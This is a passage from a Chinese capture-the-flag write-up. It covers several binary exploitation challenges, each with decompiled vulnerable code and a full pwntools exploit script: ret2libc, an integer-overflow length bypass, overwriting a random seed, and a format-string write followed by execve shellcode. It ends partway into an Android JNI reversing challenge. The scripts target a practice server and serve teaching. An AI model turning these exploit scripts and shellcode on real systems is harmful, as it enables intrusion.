class="line">p.sendline(<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;please&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>[/collapse]</p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p>考点：栈溢出、ROP（ret2libc）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;amp;buf, <span class="number">0x100</span>u);	<span class="comment">//溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打开了 NX 保护栈数据不可执行，程序没有预留后门。解决办法就是 ret2libc ，这种方法在《蒸米一步一步学ROP》中有详细讲解。<br>第一次执行是用于泄露 libc 地址；第二次调用 system 完成 ret2libc。</p>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcSearch <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">43333</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./level3&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;;write&#x27;</span>;]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;;write&#x27;</span>;]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;;main&#x27;</span>;]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x88</span>+<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x4</span></span><br><span class="line">payload += p32(write_plt)+p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">write_leak = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&quot;write_leak:&quot;</span>+<span class="built_in">hex</span>(write_leak))</span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;;write&#x27;</span>;]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;;system&#x27;</span>;]</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">binsh_addr = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>() + libc_base</span><br><span class="line">log.success(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x88</span>+<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x4</span></span><br><span class="line">payload += p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>[/collapse]</p>
<h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p>栈溢出。位置在 check_passwd strcpy ，s 最大长度为 0x199 。不能直接进行溢出，有检查 s 长度的函数，设想是限定在 4~8 。重点在于 s 的长度存储变量使用的是 unsigned int 类型，也就是最大长度为 255 （2的8次方-1）。</p>
<p>要绕过这个限制才能溢出控制 eip 。绕过方法很简单，这个变量存储单元是 8 位，如果长度为 256 的话，程序就认为长度为 0 。因为 256 的二进制是 0b100000000 ，低八位为 0b00000000 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &amp;lt;= <span class="number">3u</span> || v3 &amp;gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;amp;dest, s);	<span class="comment">//溢出</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;;111.198.29.45&#x27;</span>;,<span class="number">30389</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./int&quot;)</span></span><br><span class="line">what_is_this = <span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x14</span></span><br><span class="line">payload += <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x4</span></span><br><span class="line">payload += p32(what_is_this)</span><br><span class="line">payload = payload.ljust(<span class="number">256</span>+<span class="number">6</span>,<span class="string">&#x27;;b&#x27;</span>;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;;choice:&#x27;</span>;,<span class="string">&#x27;;1&#x27;</span>;)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;;username:&#x27;</span>;,<span class="string">&#x27;;author_skye&#x27;</span>;)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;;passwd:&#x27;</span>;)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>[/collapse]</p>
<h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p><strong>考察点：利用栈溢出固定随机数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to a guess number game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please let me know your name!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name:&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  gets((__int64)&amp;amp;v7);							<span class="comment">//栈溢出</span></span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &amp;lt;= <span class="number">9</span>; ++i )                    <span class="comment">// 连续正确10次</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your guess number:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;amp;v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;---------------------------------&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于题目开启 Canary 不能直接控制 eip ，观察栈空间发现 v7 位于 seed 前面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-000000000000003C var_3C          dd ?</span><br><span class="line">-0000000000000038 var_38          dd ?</span><br><span class="line">-0000000000000034 var_34          dd ?</span><br><span class="line">-0000000000000030 v7              db ?</span><br><span class="line">-000000000000002F                 db ? ; undefined</span><br><span class="line">-000000000000002E                 db ? ; undefined</span><br><span class="line">						…………</span><br><span class="line">						…………</span><br><span class="line">-0000000000000010 seed            dd 2 dup(?)</span><br><span class="line">-0000000000000008 var_8           dq ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br></pre></td></tr></table></figure>

<p>随机数的随机性是基于 seed 种子，当固定 seed 时，实际上生成的是伪随机数，也就是一个固定的值。这道题几时利用 gets 造成栈溢出覆盖 seed 固定生成随机数，配合 ctypes 库实现 python、c 混合编程。</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">57280</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;;./b59204f56a0545e8a22f8518e749f19f&#x27;;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;;Your name:&#x27;</span>;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	num = <span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;;number:&#x27;</span>;)</span><br><span class="line">	p.sendline(num)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>[/collapse]</p>
<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p><strong>考点：格式化字符串任意地址写小数</strong></p>
<p>题目前面有几个条件循环绕过，反编译就能看出，不再赘述。看漏洞函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400BB9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You travel a short distance east.That&#x27;;s odd, anyone disappear suddenly&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;, what happend?! You just travel , and find another hole&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>);</span><br><span class="line">  _isoc99_scanf((__int64)<span class="string">&quot;%d&quot;</span>, (__int64)&amp;amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;A voice heard in your mind&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;;Give me an address&#x27;;&quot;</span>);</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%ld&quot;</span>, (__int64)&amp;amp;v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And, you wish is:&quot;</span>);</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your wish is&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;amp;format, &amp;amp;format);                   <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I hear it, I hear it....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可控制的第一个参数是在 18 行，偏移为 7 。这里利用方式有多种，利用偏移 7 和 8 控制任意写入，也可只利用偏移 8 任意输入。（exp 使用偏移 7 和 8）</p>
<p>修改 v3 值后，绕过最后一个障碍。然后写入一段 shellcode 即可。shellcraft 生成的没有效果，就去 <a target="_blank" rel="noopener" href="http://shell-storm.org/">http://shell-storm.org/</a> 找了一个。</p>
<p>完整 exp ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">48602</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./string&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">v3 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;;\n&#x27;</span>;,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;v3:&quot;</span>+<span class="built_in">hex</span>(v3))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;secret[1] is &quot;</span>)</span><br><span class="line">v3_1 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;;\n&#x27;</span>;,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;v3_1:&quot;</span>+<span class="built_in">hex</span>(v3_1))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;aaaaaaaa%p%p%p%p%p%p%p%p%p&quot;</span></span><br><span class="line"><span class="comment">#offset = 7</span></span><br><span class="line">payload = <span class="string">&quot;%85c%7$n&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;up?:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;east&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave(0)?:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;address&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(v3))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;is:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%85c%7$n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line">shellcode = <span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;USE YOU SPELL&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>[/collapse]</p>
<h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="eastjni"><a href="#eastjni" class="headerlink" title="eastjni"></a>eastjni</h3><p><strong>考点：自定义密码表base加密、so</strong></p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>前面的怎么定位 java 层关键位置就略过，查一下错误弹窗就能找到。</p>
<p>输入字符串会作为 mainactivity/a 的参数输入：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        a locala = <span class="keyword">new</span> com/a/easyjni/a;</span><br><span class="line">        locala.&lt;init&gt;();</span><br><span class="line">        bool = ncheck(locala.a(paramString.getBytes()));</span><br><span class="line">        <span class="keyword">return</span> bool;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception paramString)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">boolean</span> bool = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后又作为 com/a/easyjni/a 的参数输入，到达第一层加密：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span>[] a = &#123; <span class="number">105</span>, <span class="number">53</span>, <span class="number">106</span>, <span class="number">76</span>, <span class="number">87</span>, <span class="number">55</span>, <span class="number">83</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">54</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">118</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">121</span>, <span class="number">52</span>, <span class="number">113</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">50</span>, <span class="number">81</span>, <span class="number">43</span>, <span class="number">98</span>, <span class="number">100</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">103</span>, <span class="number">75</span>, <span class="number">79</span>, <span class="number">73</span>, <span class="number">84</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">85</span>, <span class="number">114</span>, <span class="number">70</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">80</span>, <span class="number">122</span>, <span class="number">104</span>, <span 